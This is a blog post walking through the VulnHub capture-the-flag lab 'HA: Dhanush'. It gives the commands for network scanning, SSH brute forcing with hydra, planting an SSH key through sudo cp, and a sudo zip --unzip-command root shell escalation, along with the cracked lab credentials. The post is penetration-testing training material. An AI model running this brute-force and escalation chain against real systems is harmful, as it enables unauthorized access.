@@ -1,0 +1,96 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">HA: Dhanush Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-dhanush-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-11-28T14:06:26+00:00">November 28, 2019</time><time class="updated" datetime="2025-06-10T20:10:53+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve our Boot to Root challenge called “HA Dhanush”. We have developed this lab for the purpose of online penetration practices. It is based on the weapon that was part of all the wars in medieval times. The Bow and Arrow. As the lab is titled Dhanush. Some information about Indian Mythology and Bows might help. Let’s Solve it!!</span></p>
+<p><span style="color: #000000;"><strong>Download <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/ha-dhanush,396/">Here</a></span></strong></span></p>
+<p><span style="color: #000000;"><strong>Level: Intermediate</strong></span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> To Enumerate the Target Machine and Get the Root Access.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Creating a Dictionary from the Webpage</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Bruteforce the SSH</span></li>
+<li><span style="color: #000000;">Generating SSH Public key for another user</span></li>
+<li><span style="color: #000000;">Logging in as another user</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Identify Sudo Rights to zip command</span></li>
+<li><span style="color: #000000;">Abusing Sudo Rights</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">After downloading, run the Machine in VMWare Workstation. To work on the machine, we will be needing its IP Address. For this, we will be using the netdiscover command. After matching the MAC and IP Address we found the Virtual Machine IP Address to be 192.168.1.101.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-NmgSmoTI3aA/Xd_RdjqlNZI/AAAAAAAAhs0/HlmwYc0J_9cf76oYqt3PTvOVcPhnHkOkgCLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now that we have the Target Machine IP Address, our next logical step would be to do a port scan on the target to get information about the various services that are running on the target machine. We usually do just the Aggressive Scan, but in this case, we are going for all port scan. By default, Nmap scans the most common 1,000 ports for each protocol. So, we can specify <strong>-p-</strong> to scan ports from 1 through 65535. This is done as it is safe to practice to change the port of a service to an uncommon port. After the scan of all the ports, we see that we have the HTTP service (80), SSH service (65345) running on the Target Machine.</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.101</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-FGb8gfbyQ8Y/Xd_RdqmuJ4I/AAAAAAAAhs4/yMBTh209ccUF1HadDuYZLAS5MZebIQlagCLcBGAsYHQ/s1600/2.png"/></h3>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Moving on, we observed that we have the HTTP service running. It is probable that a web page is hosted. So, we decided to take a look through our Web Browser. We did thorough browsing of the webpage. We went through its source code and images, but there was no way in or any hint.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Y282-jlxmn4/Xd_RdWGXpDI/AAAAAAAAhsw/g74UagRC3kktypo8XG21iiel32UQ72xdACLcBGAsYHQ/s1600/3.jpg"/></p>
+<p><span style="color: #000000;">Now, before moving further, we thought as this webpage contains tons of information over the Dhanush. Also, these can be probably usernames or passwords. So, we decided to make a dictionary using the cewl command.</span></p>
+<pre class="lang:default decode:true">cewl http://192.168.1.101/ -w dict.txt
+cat dict.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-MZuWNn5zVA8/Xd_ReHDKHgI/AAAAAAAAhs8/-dsHeIyN7EgE_e6D68ZnaFQW5OIjP5QXQCLcBGAsYHQ/s1600/4.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">We decide to start our attempt to exploit this target machine from the port which the author has gone lengths to protect from the naked eye. The port number 65345 with the SSH service. As we have no usernames or the passwords so we decide to bruteforce this ssh login using the dictionary that we just created. We will be using the hydra for the login bruteforce. We are in luck; we got the login credentials for the SSH.</span></p>
+<pre class="lang:default decode:true">Username: pinak
+Password: Gandiv
+hydra -L user.txt -P dict.txt 192.168.1.101 ssh -s 65345 -e nsr</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Hc3jJR6tjhs/Xd_ReWvlp6I/AAAAAAAAhtA/58IR_YmNECALTavbSQ1eIFGxdcPIpWauQCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">Now that we have the login credentials for the SSH, we decided to login and take a look. We ran the sudo -l command to check the sudoers list and found that cp command which works runs as sarang user without any password, hence it can be used. So, we decided to take a look at the user sarang. In the home directory of sarang we see a hidden directory labelled “.ssh”. We tried to open it but it was restricted.</span></p>
+<pre class="lang:default decode:true">ssh pinak@192.168.101 -p 65345
+sudo -l
+cd /home/sarang
+ls -la
+cd .ssh</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-UvGb7B1z6WA/Xd_RerRGjHI/AAAAAAAAhtE/sYVQwlHmceg2kMsaAfwbWQlqhogd1EwtACLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">We decided to use the cp command to get inside the sarang user. To do this we will be needing the ssh keys to be present in the .ssh directory inside the sarang user home directory. Now although the file is restricted to read we can use the cp command to send the keys inside that directory. To do this first we need to generate those keys. We will be using the ssh-keygen for that particular purpose. After working with ssh-keygen, we move into the .ssh directory inside the pinak user home directory to find the id_rsa public key. We gave it proper permissions. And moved it to the pinak user home directory as shown in the image given.</span></p>
+<pre class="lang:default decode:true">ssh-keygen
+cd .ssh
+ls
+chmod 777 id_rsa.pub
+cp id_rsa.pub /home/pinak</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5beNO_y2Hts/Xd_RfIl53ZI/AAAAAAAAhtI/jyga9pv0BcA7hBUq8dDdpkRgMWENHShLgCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">Now that we have transferred the public key, its time use the cp command as user sarang to copy the public key inside the .ssh directory in sarang user home directory. We need to use sudo along with the cp command and provide the source directory and destination directory. After doing this, all we need it to login as sarang with the key that we just transferred. We can see that it works nicely. After the successful login as the user sarang, we ran the sudo -l command again as this user is not root and out target is to get root. We see that the zip command has the sudo right that can be abused to escalate privilege on this machine.</span></p>
+<pre class="lang:default decode:true">sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys
+ssh sarang@127.0.0.1 -i /.ssh/id_rsa -p 65345
+sudo -l</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-4wWVbk0mWaE/Xd_RfUWoRqI/AAAAAAAAhtM/jZ3E9RSUr3M-mBhv0BDZ8gJ2ZPh-kd25ACLcBGAsYHQ/s1600/8.png"/></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
+<p><span style="color: #000000;">We use recently logged in through ssh as user sarang. Then we use the sudo command to list all the commands the user can run with root privileges and we can see that the user can run zip commands as root without the need to enter any password.</span></p>
+<p><span style="color: #000000;">So, now in the process of escalating the privileges from “sarang” to “root”. At first, we create a file ‘raj’ than we perform three different tasks in a single line of code: first, we zip the file ‘raj’ second move it to /home/raj.zip folder and lastly unzip it which will pop the root shell.</span></p>
+<pre class="lang:default decode:true">touch raj
+pwd
+sudo zip /tmp/raj.zip /home/sarang/raj -T --unzip-command="sh -c /bin/bash"
+cd /root
+ls
+cat flag.txt</pre>
+<p><span style="color: #000000;">Finally, we get ‘flag.txt’ inside the root directory. Hence, we accomplished our mission to get the root shell on this Boot2Root Machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-NOjCzRKtBbM/Xd_RfpoUxmI/AAAAAAAAhtQ/5nDzwxmnbkk8uHpqZKnvOo28Ly0bR1OxwCLcBGAsYHQ/s1600/9.png"/></p>
+<p><strong>Author: </strong>Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on Twitter and <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">LinkedIn</a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
